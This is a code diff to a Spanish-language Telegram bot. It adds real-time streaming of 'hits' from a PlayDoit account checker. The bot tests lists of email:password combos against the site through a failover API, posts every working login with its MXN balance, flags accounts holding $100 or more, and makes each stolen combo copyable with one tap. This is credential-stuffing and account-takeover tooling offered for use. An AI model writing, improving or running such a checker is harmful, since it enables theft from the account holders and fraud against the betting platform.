@@ -20,7 +20,7 @@ from telegram import (
     BotCommandScopeChat,
 )
 from telegram.request import HTTPXRequest
-from telegram.error import NetworkError, TimedOut, Conflict
+from telegram.error import NetworkError, TimedOut, Conflict, RetryAfter, BadRequest
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -292,6 +292,33 @@ async def _edit_msg(query, text: str, reply_markup=None):
         await query.edit_message_text(
             text=text, parse_mode="HTML", reply_markup=reply_markup
         )
+
+
+async def _safe_edit_tg(msg, text: str, parse_mode: str = "HTML") -> bool:
+    """Edita un mensaje de forma segura manejando RetryAfter y errores comunes de Telegram."""
+    if not msg:
+        return False
+    for attempt in range(3):
+        try:
+            await msg.edit_text(text, parse_mode=parse_mode)
+            return True
+        except RetryAfter as ra:
+            await asyncio.sleep(ra.retry_after + 0.3)
+        except BadRequest as br:
+            msg_str = str(br).lower()
+            if "not modified" in msg_str:
+                return True
+            if "message to edit not found" in msg_str:
+                return False
+            logger.warning(f"[TG] BadRequest edit: {br}")
+            return False
+        except Exception as e:
+            if attempt < 2:
+                await asyncio.sleep(0.5)
+            else:
+                logger.debug(f"[TG] Error en safe_edit: {e}")
+                return False
+    return False
 
 
 async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1094,10 +1121,48 @@ async def handle_check_playdoit_callback(update: Update, context: ContextTypes.D
         return ConversationHandler.END
 
 
+def _format_playdoit_hit_line(hit: Any) -> str:
+    """Formatea una línea de hit: balance primero, luego combo copiable.
+    Diferenciador 💰 para cuentas con saldo >= $100.
+    """
+    if isinstance(hit, dict):
+        bal = float(hit.get("balance_total", 0.0) or 0.0)
+        email = hit.get("email", "")
+        password = hit.get("password", "")
+    else:
+        bal = float(getattr(hit, "balance_total", 0.0) or 0.0)
+        email = getattr(hit, "email", "")
+        password = getattr(hit, "password", "")
+    combo = f"{email}:{password}"
+    if bal >= 100.0:
+        return f"💰 <b>${bal:,.2f}</b> | <code>{combo}</code>"
+    elif bal > 0.0:
+        return f"• <b>${bal:,.2f}</b> | <code>{combo}</code>"
+    else:
+        return f"• $0.00 | <code>{combo}</code>"
+
+
+def _build_playdoit_hits_block_text(
+    hits_block: List[Any], total_hits: int, block_num: int = 1
+) -> str:
+    """Construye el texto formateado para el bloque de hits en modo stream."""
+    tag = f" — Lote {block_num}" if block_num > 1 else ""
+    lines = [
+        f"🎯 <b>HITS PLAYDOIT ({total_hits}){tag}</b>",
+        "💡 <i>Toca un combo para copiar</i>\n",
+    ]
+    for h in hits_block:
+        lines.append(_format_playdoit_hit_line(h))
+    text = "\n".join(lines)
+    if len(text) > 4000:
+        text = text[:3950] + "\n<i>▸ ... más hits en siguiente mensaje</i>"
+    return text
+
+
 async def _run_check_playdoit_task(
     chat_id: int, bot, valid_combos: List[Dict[str, Any]], operator_id: int
 ):
-    """Ejecuta verificación PlayDoit usando playdoit_api y persiste en playdoit_db."""
+    """Ejecuta verificación PlayDoit usando playdoit_api con streaming de hits en tiempo real."""
     from playdoit_api import check_playdoit_with_failover
     from playdoit_db import upsert_playdoit_account
 
@@ -1107,6 +1172,10 @@ async def _run_check_playdoit_task(
     total_balance_found = 0.0
     total = len(valid_combos)
     hits_list: List[Any] = []
+    current_hit_buffer: List[Any] = []
+    hit_message = None
+    block_index = 1
+    HITS_PER_BLOCK = 50
 
     status_msg = await bot.send_message(
         chat_id=chat_id,
@@ -1134,6 +1203,62 @@ async def _run_check_playdoit_task(
                 hits_count += 1
                 total_balance_found += result.balance_total
                 hits_list.append(result)
+                current_hit_buffer.append(result)
+
+                # STREAM MODE: Actualizar o crear bloque de hits en tiempo real
+                try:
+                    hits_text = _build_playdoit_hits_block_text(
+                        current_hit_buffer, hits_count, block_index
+                    )
+                    if hit_message is None:
+                        # Primer hit: enviar mensaje de hits
+                        hit_message = await bot.send_message(
+                            chat_id=chat_id, text=hits_text, parse_mode="HTML"
+                        )
+                        # Mover el mensaje de progreso abajo para mantenerlo visible al fondo
+                        try:
+                            await status_msg.delete()
+                        except Exception:
+                            pass
+                        status_msg = await bot.send_message(
+                            chat_id=chat_id,
+                            text=(
+                                f"⏳ <b>Progreso PlayDoit:</b> {idx}/{total} procesados...\n"
+                                f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>\n"
+                                f"• Saldo acumulado: <b>${total_balance_found:,.2f}</b>"
+                            ),
+                            parse_mode="HTML",
+                        )
+                    else:
+                        if len(current_hit_buffer) < HITS_PER_BLOCK and len(hits_text) <= 3900:
+                            await _safe_edit_tg(hit_message, hits_text)
+                        else:
+                            # Bloque lleno: congelar actual y abrir nuevo bloque
+                            block_index += 1
+                            current_hit_buffer = [result]
+                            new_block_text = _build_playdoit_hits_block_text(
+                                current_hit_buffer, hits_count, block_index
+                            )
+                            hit_message = await bot.send_message(
+                                chat_id=chat_id, text=new_block_text, parse_mode="HTML"
+                            )
+                            # Mover progreso abajo del nuevo bloque
+                            try:
+                                await status_msg.delete()
+                            except Exception:
+                                pass
+                            status_msg = await bot.send_message(
+                                chat_id=chat_id,
+                                text=(
+                                    f"⏳ <b>Progreso PlayDoit:</b> {idx}/{total} procesados...\n"
+                                    f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>\n"
+                                    f"• Saldo acumulado: <b>${total_balance_found:,.2f}</b>"
+                                ),
+                                parse_mode="HTML",
+                            )
+                except Exception as ex_stream:
+                    logger.warning(f"[check_playdoit] Error en stream de hits: {ex_stream}")
+
             elif result and result.account_dead:
                 try:
                     upsert_playdoit_account(result.to_dict(), checked_by=operator_id)
@@ -1145,11 +1270,11 @@ async def _run_check_playdoit_task(
 
             if idx % 2 == 0 or idx == total:
                 try:
-                    await status_msg.edit_text(
+                    await _safe_edit_tg(
+                        status_msg,
                         f"⏳ <b>Progreso PlayDoit:</b> {idx}/{total} procesados...\n"
                         f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>\n"
                         f"• Saldo acumulado: <b>${total_balance_found:,.2f}</b>",
-                        parse_mode="HTML",
                     )
                 except Exception:
                     pass
@@ -1159,17 +1284,15 @@ async def _run_check_playdoit_task(
                     f"[check_playdoit] Progreso: {idx}/{total} | Hits: {hits_count} | Dead: {dead_count} | Errors: {errors_count} | Saldo: ${total_balance_found:,.2f}"
                 )
 
-        hits_section = ""
-        if hits_list:
-            hits_lines = []
-            for h in hits_list[:25]:
-                if getattr(h, "balance_total", 0.0) >= 100.0:
-                    hits_lines.append(f"💰 <code>{h.email}:{h.password}</code> | <b>${h.balance_total:,.2f}</b>")
-                else:
-                    hits_lines.append(f"• <code>{h.email}:{h.password}</code> | ${h.balance_total:,.2f}")
-            hits_section = "\n\n🎯 <b>HITS ENCONTRADOS:</b>\n" + "\n".join(hits_lines)
-            if len(hits_list) > 25:
-                hits_section += f"\n<i>...y {len(hits_list) - 25} hits más registrados en BD.</i>"
+        # Sincronización final del último bloque de hits
+        if hit_message and current_hit_buffer:
+            try:
+                final_hits_text = _build_playdoit_hits_block_text(
+                    current_hit_buffer, hits_count, block_index
+                )
+                await _safe_edit_tg(hit_message, final_hits_text)
+            except Exception:
+                pass
 
         final_text = (
             f"<b>✅ VERIFICACIÓN PLAYDOIT FINALIZADA</b>\n\n"
@@ -1178,15 +1301,20 @@ async def _run_check_playdoit_task(
             f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
             f"• <b>Errores de Red / Proxy:</b> {errors_count}\n"
             f"• <b>Saldo Total Encontrado:</b> <b>${total_balance_found:,.2f} MXN</b>"
-            f"{hits_section}"
         )
         logger.info(
             f"[check_playdoit] RESUMEN: {total} procesados | {hits_count} HITS (${total_balance_found:,.2f}) | {dead_count} DEAD | {errors_count} ERRORS"
         )
-        await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
+        try:
+            await status_msg.edit_text(final_text, parse_mode="HTML")
+        except Exception:
+            await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
     except asyncio.CancelledError:
         logger.info(f"[check_playdoit] Tarea cancelada por operador {operator_id}")
-        await bot.send_message(chat_id=chat_id, text="🛑 <b>Verificación de PlayDoit cancelada por el operador.</b>", parse_mode="HTML")
+        try:
+            await status_msg.edit_text("🛑 <b>Verificación de PlayDoit cancelada por el operador.</b>", parse_mode="HTML")
+        except Exception:
+            await bot.send_message(chat_id=chat_id, text="🛑 <b>Verificación de PlayDoit cancelada por el operador.</b>", parse_mode="HTML")
     except Exception as ex:
         logger.error(f"[check_playdoit] Error inesperado en _run_check_playdoit_task: {ex}", exc_info=True)
         await bot.send_message(chat_id=chat_id, text=f"❌ Error durante el check PlayDoit: {ex}")
